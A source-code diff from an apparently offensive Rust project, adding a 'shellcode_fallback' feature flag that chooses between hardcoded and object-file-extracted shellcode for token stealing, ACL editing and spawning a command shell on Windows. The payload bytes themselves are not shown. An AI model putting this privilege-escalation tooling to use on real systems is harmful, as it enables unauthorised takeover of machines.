@@ -1,5 +1,7 @@
 use byte_strings::concat_bytes;
+#[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
 use goblin::pe::section_table::IMAGE_SCN_CNT_CODE;
+#[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
 use goblin::Object;
 
 pub fn token_stealing_shellcode_fallback() -> [u8; 84] {
@@ -181,7 +183,7 @@ pub fn spawn_cmd_shellcode_fallback() -> [u8; 387] {
     .clone();
 }
 
-#[cfg(target_os = "windows")]
+#[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
 fn extract_shellcode_from_obj(shellcode_obj: &[u8]) -> Vec<u8> {
     let obj = Object::parse(shellcode_obj).expect("[-] Failed to parse object file");
 
@@ -209,22 +211,37 @@ fn extract_shellcode_from_obj(shellcode_obj: &[u8]) -> Vec<u8> {
     instructions
 }
 
-#[cfg(target_os = "windows")]
+#[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
 pub fn token_stealing_shellcode() -> Vec<u8> {
     let shellcode_obj = include_bytes!("asm/token_stealing.obj");
     extract_shellcode_from_obj(shellcode_obj)
 }
 
-#[cfg(target_os = "windows")]
+#[cfg(all(target_os = "windows", feature = "shellcode_fallback"))]
+pub fn token_stealing_shellcode() -> Vec<u8> {
+    token_stealing_shellcode_fallback().to_vec()
+}
+
+#[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
 pub fn acl_edit_shellcode() -> Vec<u8> {
     let shellcode_obj = include_bytes!("asm/acl_edit.obj");
     extract_shellcode_from_obj(shellcode_obj)
 }
 
-#[cfg(target_os = "windows")]
+#[cfg(all(target_os = "windows", feature = "shellcode_fallback"))]
+pub fn acl_edit_shellcode() -> Vec<u8> {
+    acl_edit_shellcode_fallback().to_vec()
+}
+
+#[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
 pub fn spawn_cmd_shellcode() -> Vec<u8> {
     let shellcode_obj = include_bytes!("asm/spawn_cmd.obj");
     extract_shellcode_from_obj(shellcode_obj)
+}
+
+#[cfg(all(target_os = "windows", feature = "shellcode_fallback"))]
+pub fn spawn_cmd_shellcode() -> Vec<u8> {
+    spawn_cmd_shellcode_fallback().to_vec()
 }
 
 #[cfg(target_os = "windows")]
